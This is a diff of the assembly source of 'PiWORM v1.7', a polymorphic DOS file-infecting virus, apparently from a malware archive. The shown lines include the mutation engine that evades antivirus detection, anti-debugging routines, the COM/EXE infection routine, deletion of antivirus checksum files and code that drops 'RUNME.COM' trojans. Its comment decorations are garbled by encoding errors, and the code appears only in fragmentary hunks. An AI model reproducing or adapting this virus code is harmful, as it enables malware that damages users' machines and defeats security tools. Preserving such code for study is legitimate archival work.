@@ -1,23 +1,34 @@
+; ------------------------------------------------------------
+; name      P
+; type      asm
+; cve       Б─■
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     Б─■
+; ------------------------------------------------------------
 
 ; **Beta Code**
-;   ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд------
-;    PiОWИRM v1.7 coded by Шirogen ╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟
-;      Ч Variant A                 ╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟
-;   ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд------
+;   О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫------
+;    PiО©╫WО©╫RM v1.7 coded by О©╫irogen О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+;      О©╫ Variant A                 О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+;   О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫------
 ;
 ;  See enclosed NFO for more info..
 ;
 ;  version 1.5:
-;     Ч Conditional compilation equates added for creation of new variants
-;     Ч Improved polymorphic engine
-;     Ч Fixed possible bug in polymorphic engine after 50 or so generations
+;     О©╫ Conditional compilation equates added for creation of new variants
+;     О©╫ Improved polymorphic engine
+;     О©╫ Fixed possible bug in polymorphic engine after 50 or so generations
 ;  version 1.6:
-;     Ч Re-Enabled Constant 1 Byte Garbage Generation
-;     Ч Changed activation routine
+;     О©╫ Re-Enabled Constant 1 Byte Garbage Generation
+;     О©╫ Changed activation routine
 ;  version 1.7:
-;     Ч The virus will now spawns trojans entitiled "RUNME.COM" if there are
+;     О©╫ The virus will now spawns trojans entitiled "RUNME.COM" if there are
 ;       many successive failed infection attempts.
-;     Ч Added SAFE_MEM compile option
+;     О©╫ Added SAFE_MEM compile option
 ;
 ;  compile like so:
 ;   TASM /m pw17
@@ -28,9 +39,9 @@
 cseg    segment
 	assume  cs: cseg, ds: cseg, es: cseg, ss: cseg
 
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Compile Options ╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟
-; ддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Compile Options О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 SECOND_CRYPT equ 0                      ; use second cryptor?
 INCLUDE_INT3 equ 1                      ; include INT 3 in garbage code?
 					; (slows the loop down alot)
@@ -43,9 +54,9 @@ MAX_EXE      equ 4                      ; max exe file size -high byte
 TROJAN_NUM    equ 0Fh                   ; count before spawning trojan
 
 
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Polymorphic Engine Equates ╟╟╟╟╟╟╟╟╟╟╟╟
-; ддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Polymorphic Engine Equates О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 INC_BUF_SIZE   equ 38                   ; INC buf
 ENC_OP_BSIZE   equ 38                   ; ENC buf
 PTR_BUF_SIZE   equ 38                   ; PTR buf
@@ -53,9 +64,9 @@ CNT_BUF_SIZE   equ 38                   ; CNT&OP
 DJ_BUF_SIZE    equ 38                   ; DEC&JMP
 GARBAGE_OPS    equ 0Fh                  ; # of garbage ops in each group
 
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Misc. ╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟
-; ддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Misc. О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 enc_size     equ   offset first_crypt-offset encrypt
 enc2_size    equ   offset code_start-offset first_crypt
 TROJAN_DATA_LEN equ (offset td_end-offset trojan_data)
@@ -67,9 +78,9 @@ cr           equ   0ah
 org     0h
 
 start:
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Polymorphic Encryptor/Decryptor Buffer
-; ддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Polymorphic Encryptor/Decryptor Buffer
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ;
  encrypt:
 	ptr_buf    db PTR_BUF_SIZE dup (90h)
@@ -83,20 +94,20 @@ start:
 first_crypt:                            ; end of first cryptor
 
 
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Second Decryptor - Anti-Debugging ╟╟╟╟╟
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; Ч Uses reverse direction word XOR encryption
-; Ч Uses the following techniques:
-;    П JMP into middle of operand
-;    П Replace word after CALL to kill stepping over call
-;    П Kills INT 1 vector
-;    П Disables Keyboard via Port 21h
-;    П Reverse direction encryption prevents stepping past loop
-;    П Uses SP as a crucial data register in some locations - if
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Second Decryptor - Anti-Debugging О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫ Uses reverse direction word XOR encryption
+; О©╫ Uses the following techniques:
+;    О©╫ JMP into middle of operand
+;    О©╫ Replace word after CALL to kill stepping over call
+;    О©╫ Kills INT 1 vector
+;    О©╫ Disables Keyboard via Port 21h
+;    О©╫ Reverse direction encryption prevents stepping past loop
+;    О©╫ Uses SP as a crucial data register in some locations - if
 ;      the debugger uses the program's stack, then it may very well
 ;      phuck thingz up nicely.
-;    П Uses Soft-Ice INT 3 API to lock it up if in memory.
+;    О©╫ Uses Soft-Ice INT 3 API to lock it up if in memory.
 ;
 	sti                             ; fix CLI in garbage code
 	db      0BDh                    ; MOV BP,XXXX
@@ -182,9 +193,9 @@ ret2_byte db    90h,90h
 
 
 ENDIF
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Start of Viral Code ╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟
-; ддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Start of Viral Code О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
 code_start:
 IF SECOND_CRYPT
@@ -276,9 +287,9 @@ exe_jump dd     0
 oldsp   dw      0
 exe_phile db    0
 
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Infection Routine ╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟
-; ддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Infection Routine О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ;    DS:DX=fname
 ;    Assumes EXE if first byte is 'M' or 'Z'
 ;    Changes/Restores attribute and time/date
@@ -506,9 +517,9 @@ write_hdr:
 	jmp     d_time                  ; restore shit/return
 
 
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Kills CHKLIST.CPS and CHKLIST.MS ╟╟╟╟╟╟
-; ддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Kills CHKLIST.CPS and CHKLIST.MS О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ;
 
 kill_chklst:
@@ -526,9 +537,9 @@ kill_loop:
 
 	ret
 
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Set File PTR ╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟
-; ддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Set File PTR О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
 offset_zero:                            ; self explanitory
 	xor     al,al
@@ -541,9 +552,9 @@ set_fp:
 	xor     dx,dx
 	int     21h
 	ret
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Make Trojan File ╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟
-; ддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Make Trojan File О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 make_trojan:
         cmp     non_infects,TROJAN_NUM
         jl      dont_trojan
@@ -562,24 +573,24 @@ make_trojan:
 dont_trojan:
         ret
 
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Morph, copy, & crypt ╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Morph, copy, & crypt О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
 ;  0 bytes constant
 ;  0 functionally equivilant operands in constant locations
 ;
 ;  Random byte defined as:
 ;  76543210
-;  ЁЁЁЁЁЁЁюд 0=JNZ,1=JNS
-;  ЁЁЁЁЁЁюдд 0=ADD&SUB, 1=XOR
-;  ЁЁЁЁЁюддд 0=BYTE CRYPTION, 1=WORD CRYPTION
-;  ЁЁЁЁюдддд 1=INCREMENT POINTER TO 'MOV SI|DI,XXXX' OPERAND
-;  ЁЁЁюддддд 1=USE TWO BYTE GARBAGE, 0=USE ONE BYTE GARBAGE ONLY
-;  ЁЁюдддддд 1=USE CONSTANT STREAM OF ONE BYTE GARBAGE, 0=NORMAL RANDOM
-;  Ёюддддддд not used
-;  юдддддддд not used
+;  О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫ 0=JNZ,1=JNS
+;  О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫ 0=ADD&SUB, 1=XOR
+;  О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫ 0=BYTE CRYPTION, 1=WORD CRYPTION
+;  О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫ 1=INCREMENT POINTER TO 'MOV SI|DI,XXXX' OPERAND
+;  О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫ 1=USE TWO BYTE GARBAGE, 0=USE ONE BYTE GARBAGE ONLY
+;  О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫ 1=USE CONSTANT STREAM OF ONE BYTE GARBAGE, 0=NORMAL RANDOM
+;  О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫ not used
+;  О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫ not used
 ;
-; ддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 encrypt_code:
 
 	push    bx                      ; save the handle
@@ -596,7 +607,7 @@ ENDIF
 	mov     mem_word,dx             ; mem cryption too
 	mov     size_disp,dl            ; and size displacment
 
-;дддд Fill buffer space with one-byte garbage ops
+;О©╫О©╫О©╫О©╫ Fill buffer space with one-byte garbage ops
 
 	lea     di,encrypt
 	mov     bp,enc_size+1
@@ -609,7 +620,7 @@ do_constant:
 fb1:
         call    fill_buffer
 
-;дддд Randomly select between jmp type : JNZ or JNS
+;О©╫О©╫О©╫О©╫ Randomly select between jmp type : JNZ or JNS
 
 	test    enc_num,00000001b
 	jnz     jmp_2
@@ -619,7 +630,7 @@ fb1:
 	mov     byte ptr jnz_op,79h     ; jns
 	jmp_set:
 
-;дддд Select encryption type: XOR or ADD&SUB
+;О©╫О©╫О©╫О©╫ Select encryption type: XOR or ADD&SUB
 
 	mov     enc_type,04             ; default to encrypting ADD
 	mov     dec_type,2Ch            ; and decrypting SUB
@@ -629,7 +640,7 @@ fb1:
 	mov     enc_type,34h            ; encrypting XOR
 	use_add_sub:
 
-;ддд Change register used for the counter
+;О©╫О©╫О©╫ Change register used for the counter
 
 	cmp     byte ptr count_op,0BBh  ; skip SP/BP/DI/SI
 	jnz     get_reg
@@ -639,7 +650,7 @@ fb1:
 	inc     byte ptr count_op       ; increment to next register in line
 	inc     byte ptr dec_op
 
-;дддд Select position of INC DI|SI
+;О©╫О©╫О©╫О©╫ Select position of INC DI|SI
 
 	mov     ax,INC_BUF_SIZE-1
 	call    random                  ; select a position in the buffer..
@@ -648,7 +659,7 @@ fb1:
 	mov     inc_op_ptr,di           ; save ptrs
 	mov     inc_op_ptr2,di
 
-;дддд Toggle between SI and DI
+;О©╫О©╫О©╫О©╫ Toggle between SI and DI
 
 	cmp     byte ptr ptr_set,0BEh   ; using SI?
 	jz      chg_di                  ; if so, then switch to DI
@@ -662,7 +673,7 @@ fb1:
 	inc     byte ptr enc_type       ; increment encryptor
 	done_chg_ptr:
 
-;дддд Select word or byte encryption
+;О©╫О©╫О©╫О©╫ Select word or byte encryption
 
 	mov     w_b,80h                 ; default to byte cryption
 	test    enc_num,00000100b       ; use word?
@@ -677,7 +688,7 @@ fb1:
 	mov     inc_op_ptr2,di
  use_byte:
 
-;дддд Increment counter value
+;О©╫О©╫О©╫О©╫ Increment counter value
 
 	cmp     byte ptr crypt_bytes,0Fh ; byte count quite large?
 	jnz     inc_cnt                 ; if not..increment away
@@ -686,7 +697,7 @@ fb1:
 	inc     crypt_bytes             ; increment byte count
 
 
-;дддд Set DEC XX /JNS|JNZ operands
+;О©╫О©╫О©╫О©╫ Set DEC XX /JNS|JNZ operands
 
 	mov     ax,DJ_BUF_SIZE-3
 	call    random                  ; select a pos.
@@ -707,7 +718,7 @@ write_loop:
 	push    di                      ; save offset after jmp
 
 
-;дддд Set MOV DI,XXXX|MOV SI,XXXX
+;О©╫О©╫О©╫О©╫ Set MOV DI,XXXX|MOV SI,XXXX
 
 	mov     ax,PTR_BUF_SIZE-3
 	call    random                   ; select pos.
@@ -718,7 +729,7 @@ write_loop:
 	movsw                            ; write op
 	movsb
 
-;дддд Set MOV AX|BX|DX|CX,XXXX
+;О©╫О©╫О©╫О©╫ Set MOV AX|BX|DX|CX,XXXX
 
 	mov     ax,CNT_BUF_SIZE-3
 	call    random                   ; select pos.
@@ -729,7 +740,7 @@ write_loop:
 	movsw                            ; write op
 	movsb
 
-;дддд Set XOR|ADD&SUB WORD|BYTE CS:|DS:[SI|DI],XX|XXXX
+;О©╫О©╫О©╫О©╫ Set XOR|ADD&SUB WORD|BYTE CS:|DS:[SI|DI],XX|XXXX
 
 	mov     ax,ENC_OP_BSIZE-5
 	call    random                   ; select pos.
@@ -741,7 +752,7 @@ write_loop:
 	movsw
 
 IF TWO_BYTE
-;дддд Throw in some 2 byte garbage ops
+;О©╫О©╫О©╫О©╫ Throw in some 2 byte garbage ops
 	test enc_num,00010000b           ; use two-byte garbage?
 	jz no_2byte_grb
 	lea di,encrypt
@@ -775,17 +786,17 @@ IF TWO_BYTE
 no_2byte_grb:
 ENDIF
 
-;дддддддддддддддддддддддддддддддддддддддддддддддд
-;╟╟╟╟╟╟╟╟[END OF POLYMORPHIC ENGINE]╟╟╟╟╟╟╟╟╟╟╟╟╟
-;дддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫[END OF POLYMORPHIC ENGINE]О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
-;дддд FiX second cryptor offset
+;О©╫О©╫О©╫О©╫ FiX second cryptor offset
 
 IF SECOND_CRYPT
 	mov     rel2_off,offset heap    ;first gen has mispl. off
 ENDIF
 
-;дддд Copy virus code along with decryptor to heap
+;О©╫О©╫О©╫О©╫ Copy virus code along with decryptor to heap
 
 	mov     cx, (offset heap-offset start)/2+1
 	xor     si,si
@@ -793,7 +804,7 @@ ENDIF
 	rep     movsw                   ; make another copy of virus
 
 IF SECOND_CRYPT
-;дддд Call second encryptor first
+;О©╫О©╫О©╫О©╫ Call second encryptor first
 
 	mov     si,offset vend          ; offset of enc. start..
 	add     si,offset heap          ; ..at end of code
@@ -803,13 +814,13 @@ IF SECOND_CRYPT
 	mov     ret2_byte,90h
 ENDIF
 
-;дддд Set ptr to heap for encryption
+;О©╫О©╫О©╫О©╫ Set ptr to heap for encryption
 
 	pop     si                      ; pop offset after jmp
 	add     si,offset vend          ; offset we'z bez encrypting
 	mov     di,si                   ; we might be using DI too
 
-;дддд Encrypt the mother fucker
+;О©╫О©╫О©╫О©╫ Encrypt the mother fucker
 
 	mov     ret_byte,0C3h           ; put RET
 	mov     al,enc_type
@@ -820,8 +831,8 @@ ENDIF
 	pop     bx                      ; restore phile handle
 	ret                             ; return
 
-; дддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Garbage Code Filler ╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Garbage Code Filler О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ;    DS:DI = buffer address
 ;       BP = buffer size
 ;       BL = 0 - Use 1 byte constant garbage op
@@ -830,7 +841,7 @@ ENDIF
 ;
 ;  Decently random..relies on previously encrypted data and MS from clock
 ;  to form pointer to the next operand to use..
-; дддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ;
 fill_buffer:
 	push    ax
@@ -881,11 +892,11 @@ in_range:
 _fret:  ret
 
 IF TWO_BYTE
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Fill Bytes Between Two Ops /w Garb.╟╟╟╟
